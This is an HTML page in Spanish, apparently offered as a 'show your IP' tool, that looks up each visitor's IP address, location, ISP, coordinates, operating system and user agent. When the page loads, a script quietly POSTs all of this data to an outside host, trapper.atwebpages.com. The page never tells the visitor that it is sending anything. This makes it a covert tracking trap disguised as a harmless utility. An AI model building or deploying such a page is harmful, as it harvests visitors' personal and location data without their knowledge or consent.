<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Información de la IP</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f2f5;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 30px;
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #333;
        }
        #resultado {
            padding: 20px;
            border-radius: 10px;
            background-color: #e9ecef;
            margin-top: 30px;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
        }
        #resultado p {
            margin: 8px 0;
            color: #495057;
        }
        .error {
            color: #d9534f;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Tu IP</h1>
        <div id="resultado"></div>
    </div>

    <script>
        async function obtenerInformacionIP() {
            try {
                let response = await fetch("http://ip-api.com/json/");
                if (!response.ok) {
                    throw new Error('Error en la solicitud: ' + response.statusText);
                }
                let data = await response.json();

                let userAgent = navigator.userAgent;
                let os = "Unknown";
                if (userAgent.includes("Windows")) os = "Windows";
                else if (userAgent.includes("Mac")) os = "Mac";
                else if (userAgent.includes("Linux")) os = "Linux";
                else if (userAgent.includes("Android")) os = "Android";
                else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";

                document.getElementById('resultado').innerHTML = `
                    <p>IP: ${data.query}</p>
                    <p>País: ${data.country}</p>
                    <p>Región: ${data.regionName}</p>
                    <p>Ciudad: ${data.city}</p>
                    <p>ISP: ${data.isp}</p>
                    <p>Latitud: ${data.lat}</p>
                    <p>Longitud: ${data.lon}</p>
                    <p>Sistema Operativo: ${os}</p>
                    <p>User Agent: ${userAgent}</p>
                `;

                // Agregar datos extra y enviar al servidor
                data.user_agent = userAgent;
                data.os = os;
                await guardarInformacionEnJSON(data);
            } catch (error) {
                console.error('Error al obtener los datos:', error);
                document.getElementById('resultado').innerHTML = `<p class="error">Error al obtener la información de la IP.</p>`;
            }
        }

        async function guardarInformacionEnJSON(data) {
            try {
                let response = await fetch("http://trapper.atwebpages.com/index.php", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(data),
                });

                if (response.ok) {
                    console.log('Datos guardados correctamente');
                } else {
                    console.error('Error al guardar los datos:', response.statusText);
                }
            } catch (error) {
                console.error('Error al enviar los datos:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', obtenerInformacionIP);
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
